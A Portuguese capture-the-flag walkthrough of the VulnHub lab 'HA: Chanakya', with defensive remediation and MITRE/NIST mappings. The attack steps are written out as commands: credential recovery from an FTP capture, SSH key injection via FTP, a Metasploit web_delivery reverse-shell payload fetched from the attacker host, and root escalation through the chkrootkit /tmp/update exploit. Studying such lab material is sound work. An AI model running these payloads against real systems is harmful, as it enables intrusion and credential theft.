# HA: Chanakya — Os Segredos do Grande Estrategista

Chanakya (Kautilya) foi o maior estrategista político da Índia antiga: autor do Arthashastra, mentor do Imperador Chandragupta Maurya e arquiteto de enganos em camadas. Esta máquina presta homenagem perfeita a ele. O caminho até o root passa por dicas codificadas, credenciais FTP em texto plano numa captura de pacotes e um exploit local do chkrootkit que pune a confiança cega em uma ferramenta de segurança rodando como root. Misdirection clássica. Mano, isso aqui é top demais.

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | HA: Chanakya |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/ha-chanakya,395/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, decodificação ROT13, análise de stream FTP no Wireshark, injeção de chave SSH via FTP, Metasploit web_delivery, escalação de privilégios via chkrootkit local |
| **CVEs** | CVE-2014-0476 (escalação de privilégios local do chkrootkit via /tmp/update) |
| **Grupos APT** | APT41: usa interceptação de credenciais em texto claro e escalação via binários nativos em ataques a Linux corporativo; Lazarus Group: explora ferramentas de segurança mal configuradas e escalação via cron em intrusões direcionadas |

---

## Resumo do Ataque

```
nmap → FTP (21), SSH (22), HTTP (80)
  → dirb -X .txt → /abuse.txt (codificado em ROT13)
  → decodificação ROT13 → ashoka.pcapng
  → wget ashoka.pcapng → stream FTP no Wireshark
  → credenciais: ashoka:kautilya
  → login FTP → mkdir .ssh → upload authorized_keys
  → ssh -i ashoka_key ashoka@alvo
  → /tmp/logs revela chkrootkit rodando como root (cron)
  → Metasploit web_delivery → sessão Meterpreter
  → exploit/unix/local/chkrootkit → uid=0(root)
  → cat /root/final.txt
```

---

## Metodologia

1. Scan completo de portas para identificar FTP, SSH e HTTP
2. Brute-force de diretórios web com filtro de extensão para encontrar arquivo de dica codificado
3. Decodificação ROT13 da dica para descobrir o nome do arquivo de captura
4. Análise de stream FTP no Wireshark para recuperar credenciais em texto claro
5. Acesso de escrita via FTP para injetar chave pública SSH no diretório home do usuário
6. Login SSH e enumeração da atividade cron do chkrootkit
7. Metasploit web_delivery para estabelecer sessão Meterpreter
8. Exploit local do chkrootkit via Metasploit para escalação root

---

## Passo 1 — Descoberta do Host e Scan de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.101

nmap -sV -sC -p- 192.168.1.101
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Três serviços: FTP sempre merece teste imediato de acesso anônimo. SSH é o alvo de movimento lateral. HTTP é a superfície primária de enumeração. A versão do vsftpd deve ser anotada para pesquisa de vulnerabilidades.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Brute-force de Diretórios Web e Decodificação ROT13

Navega para `http://192.168.1.101/` primeiro, inspeciona o código-fonte. Nada óbvio. Executa dirb com extensão `.txt`:

```bash
dirb http://192.168.1.101/ -X .txt
```

Descobre `/abuse.txt`. Lê o conteúdo:

```bash
curl http://192.168.1.101/abuse.txt
# Saída parece embaralhada — está codificada em ROT13
```

Decodifica:

```bash
curl -s http://192.168.1.101/abuse.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# Saída: ashoka.pcapng
```

Baixa a captura de pacotes:

```bash
wget http://192.168.1.101/ashoka.pcapng
```

**Nota do mundo real:** ROT13 não é criptografia. É uma cifra de substituição da era romana que não exige nenhum esforço computacional para reverter. Qualquer atacante que encontre o arquivo pode lê-lo imediatamente. Caramba, mano, organizações jamais deveriam usar codificação como controle de segurança. APT41 rotineiramente descobre arquivos de configuração e dicas expostos durante as fases iniciais de enumeração web.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1027 — Arquivos ou Informações Ofuscadas

---

## Passo 3 — Análise de Stream FTP no Wireshark

Abre a captura de pacotes:

```bash
wireshark ashoka.pcapng
```

Aplica filtro de exibição: `ftp`

Segue o stream TCP da sessão FTP. FTP transmite todos os dados, incluindo autenticação, em texto claro:

```
220 (vsFTPd 3.0.3)
USER ashoka
331 Please specify the password.
PASS kautilya
230 Login successful.
```

Credenciais recuperadas: `ashoka:kautilya`

**Alternativa via linha de comando com tshark:**

```bash
tshark -r ashoka.pcapng -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg 2>/dev/null
```

**Nota do mundo real:** FTP foi projetado em 1971, antes da existência de redes adversariais. Cada byte transmitido, incluindo senhas, é visível para qualquer pessoa no mesmo segmento de rede. O filtro `ftp` no Wireshark em qualquer tráfego capturado em uma LAN corporativa vai expor credenciais FTP em segundos. Por isso o FTP foi depreciado em frameworks de segurança corporativa há mais de uma década.

**MITRE ATT&CK:** T1552.001 — Credenciais em Arquivos; T1040 — Sniffing de Rede

---

## Passo 4 — Acesso de Escrita via FTP e Injeção de Chave SSH

Login no FTP com as credenciais recuperadas:

```bash
ftp 192.168.1.101
# Usuário: ashoka
# Senha: kautilya
ftp> ls -la
```

Verifica se existe acesso de escrita no diretório home. Gera um par de chaves SSH no atacante:

```bash
ssh-keygen -t rsa -b 2048 -f /tmp/ashoka_key -N ""
# Cria: /tmp/ashoka_key (privada) e /tmp/ashoka_key.pub (pública)
```

Na sessão FTP, cria diretório `.ssh` e faz upload da chave pública:

```bash
ftp> mkdir .ssh
ftp> cd .ssh
ftp> put /tmp/ashoka_key.pub authorized_keys
ftp> quit
```

SSH na máquina usando a chave privada:

```bash
ssh -i /tmp/ashoka_key ashoka@192.168.1.101
```

Explora o sistema. Verifica tarefas agendadas:

```bash
cat /tmp/logs
ls -la /tmp/
crontab -l
sudo cat /etc/crontab
```

`/tmp/logs` contém saída do chkrootkit, revelando que ele roda periodicamente como root via cron. Esse é o caminho de escalação.

**Nota do mundo real:** Acesso de escrita FTP ao diretório home de um usuário é funcionalmente equivalente ao acesso shell. Ao escrever um arquivo `authorized_keys`, o atacante ignora qualquer requisito de senha para SSH. Esta cadeia de ataque (escrita FTP + injeção de chave SSH) foi usada em múltiplos comprometimentos de servidores em nuvem entre 2019 e 2021, onde instâncias vsftpd mal configuradas expunham diretórios home de usuários.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH; T1098.004 — Manipulação de Conta: Chaves Autorizadas SSH

---

## Passo 5 — Metasploit web_delivery para Meterpreter

Na máquina atacante, configura o handler web_delivery do Metasploit para receber uma sessão Meterpreter do shell `ashoka`:

```bash
msfconsole -q
use exploit/multi/script/web_delivery
set TARGET 7
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.1.103
set LPORT 4444
run
```

O Metasploit gera um comando de uma linha. Executa na sessão SSH `ashoka`:

```bash
# Cola e executa o comando gerado pelo Metasploit
python3 -c "import urllib.request,os,pty;..."
```

De volta no Metasploit, uma sessão abre. Coloca em background:

```bash
sessions -l
# Anota o ID da sessão
background
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos e Scripts: Unix Shell

---

## Passo 6 — Escalação de Privilégios via chkrootkit

O exploit local do chkrootkit (CVE-2014-0476) abusa do fato de que as versões 0.49 e anteriores do chkrootkit executam `/tmp/update` como root durante a verificação do `slapper`. Se o cron executa chkrootkit como root, colocar um `/tmp/update` malicioso resulta em execução de código como root.

Usa o módulo Metasploit:

```bash
use exploit/unix/local/chkrootkit
set SESSION <id_sessao_meterpreter>
set LHOST 192.168.1.103
set LPORT 5555
run
```

O Metasploit cria `/tmp/update` com payload de reverse shell e aguarda o chkrootkit executá-lo. Quando o cron dispara:

```
[*] Waiting for chkrootkit to run via cron...
[*] Meterpreter session 3 opened
```

Confirma root:

```bash
getuid
# Server username: uid=0, gid=0, euid=0, egid=0
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/final.txt
```

**Nota do mundo real:** Ferramentas de segurança que rodam como root e executam scripts de diretórios com permissão de escrita global (`/tmp`) criam exatamente a superfície de ataque que deveriam detectar. A ironia é intencional no design desta VM. Em ambientes reais, Tripwire, OSSEC e chkrootkit já tiveram bugs similares de limite de confiança. O princípio: ferramentas de segurança precisam do mesmo hardening que os sistemas que protegem.

**MITRE ATT&CK:** T1548.001 — Abuso de Controle de Elevação: Setuid e Setgid; T1053.003 — Tarefa Agendada: Cron; T1068 — Exploração para Escalação de Privilégios

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Credencial | ashoka:kautilya | FTP em texto claro (Wireshark ashoka.pcapng) | Login FTP, injeção de chave SSH |
| Shell de usuário | ashoka | SSH via chave injetada | Ponto de entrada inicial |
| Flag root | /root/final.txt | Escalação CVE-2014-0476 via chkrootkit | Comprometimento total |

---

## Lições Aprendidas

| # | Achado | Relevância no Mundo Real | Lição Principal |
|---|---|---|---|
| 1 | Dica de credencial codificada em ROT13 em diretório web público | Divulgação de informações via ofuscação fraca; classificado no OWASP A05 Má Configuração de Segurança | Nunca colocar dicas sensíveis em caminhos públicos; codificação não é criptografia |
| 2 | FTP transmite credenciais em texto claro | Qualquer observador da rede pode capturar credenciais FTP com ferramentas básicas de análise de pacotes | Substituir FTP por SFTP ou SCP; desabilitar FTP se não for necessário; impor TLS se FTP for mantido |
| 3 | Acesso de escrita FTP ao diretório home equivale a acesso SSH | Atacantes que podem escrever em `~/.ssh/authorized_keys` ignoram todos os controles de senha | Aplicar chroot FTP estrito com permissões somente leitura; nunca expor diretórios home via FTP |
| 4 | chkrootkit executa `/tmp/update` como root | Ferramentas de segurança com separação imprópria de privilégios se tornam vetores de escalação | Atualizar chkrootkit para versão corrigida; montar `/tmp` com opção `noexec`; executar ferramentas de segurança a partir de caminhos somente leitura como não-root quando possível |
| 5 | Trabalho cron revela caminho de escalação via /tmp/logs | Arquivos de log deixados em locais com permissão de leitura global expõem componentes internos do sistema a usuários sem privilégios | Restringir saída de logs a caminhos privilegiados; minimizar a divulgação de informações a usuários sem privilégios |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso Inicial | Exploração de Aplicativo Público | T1190 |
| Acesso a Credenciais | Acesso a Credenciais | Sniffing de Rede | T1040 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Persistência | Persistência | Manipulação de Conta: Chaves Autorizadas SSH | T1098.004 |
| Execução | Execução | Interpretador de Comandos: Unix Shell | T1059.004 |
| Escalação de Privilégios | Escalação de Privilégios | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Exploração para Escalação de Privilégios | T1068 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover arquivos sensíveis de caminhos acessíveis via web**: sem dicas codificadas, capturas de pacotes ou referências de credenciais sob o web root
2. **Substituir FTP por SFTP**: configurar OpenSSH com subsistema SFTP; desabilitar vsftpd; impor autenticação por chave
3. **Restringir acesso FTP ao diretório home**: se FTP for necessário, aplicar chroot jails e permissões somente leitura; nunca expor `.ssh/` via FTP
4. **Atualizar chkrootkit**: corrigir para versão 0.50+; restringir `/tmp` com opção de montagem `noexec`; executar chkrootkit como não-root quando possível
5. **Auditar trabalhos cron**: `cat /etc/crontab`; `ls -la /etc/cron*`; garantir que nenhum trabalho cron privilegiado execute scripts de caminhos com escrita global
6. **Restringir caminhos de saída de logs**: mover saída de ferramentas de `/tmp/logs` para diretórios privilegiados; aplicar permissões de arquivo adequadas

### Contramedidas MITRE D3FEND

- **D3-NTF** — Filtragem de Tráfego de Rede (bloquear FTP; impor somente SFTP)
- **D3-ACH** — Hardening de Configuração de Aplicativo (hardening de caminho do chkrootkit; noexec /tmp)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (auditoria de trabalhos cron; separação de privilégios)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços FTP; auditar trabalhos cron com execução privilegiada |
| Proteger | Controle de Acesso | Desabilitar FTP; impor SFTP com autenticação por chave; restringir escritas no diretório home |
| Proteger | Segurança de Dados | Remover arquivos sensíveis do web root; sem dicas de credenciais em caminhos públicos |
| Detectar | Anomalias e Eventos | Alertar sobre conexões FTP; monitorar /tmp para novos arquivos executáveis |
| Responder | Planejamento de Resposta | Desabilitar FTP imediatamente; rotacionar todas as credenciais expostas; auditar authorized_keys em todos os usuários |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de snapshot de bom estado conhecido; auditar todos os binários executados por cron |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Imposição de Acesso | Controles de acesso FTP; restringir escrita no diretório home via FTP |
| AC-6 | Menor Privilégio | chkrootkit não deve rodar como root; trabalhos cron usam contas de serviço dedicadas |
| IA-5 | Gerenciamento de Autenticadores | Rotacionar todas as credenciais encontradas via captura de pacotes; desabilitar autenticação por senha FTP |
| CM-7 | Funcionalidade Mínima | Desabilitar vsftpd se não for necessário; remover serviços desnecessários |
| SC-8 | Confidencialidade e Integridade na Transmissão | Substituir FTP (texto claro) por SFTP (criptografado) |
| SI-2 | Remediação de Falhas | Corrigir chkrootkit para versão 0.50+ |

### CISA KEV

CVE-2014-0476 (escalação de privilégios local do chkrootkit) afeta sistemas executando chkrootkit sem patch como root via cron. Os Alertas CISA AA21-265A e AA22-074A referenciam escalação living-off-the-land via ferramentas de segurança mal configuradas. As organizações são aconselhadas a auditar todas as ferramentas de segurança executadas com privilégios elevados para problemas similares de limite de confiança.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |

---

## Considerações Finais

HA: Chanakya entrega uma aula magistral em misdirection em camadas, assim como o próprio personagem histórico. O Arthashastra ensina que a fortaleza mais forte tem múltiplos portões, cada um exigindo conhecimento diferente para passar. Esta máquina implementa exatamente isso: enumeração web, análise de pacotes, acesso de escrita FTP, entrega de Meterpreter e, finalmente, exploração da própria ferramenta destinada a detectar comprometimento. Sensacional, mano, top demais.

Chanakya disse famosamente: "Antes de começar algum trabalho, sempre se faça três perguntas: Por que estou fazendo isso, quais podem ser os resultados e serei bem-sucedido?" Em pentest: enumere antes de explorar, entenda a cadeia antes de puxá-la.

Thanks guys!! (❍ᴥ❍ʋ)
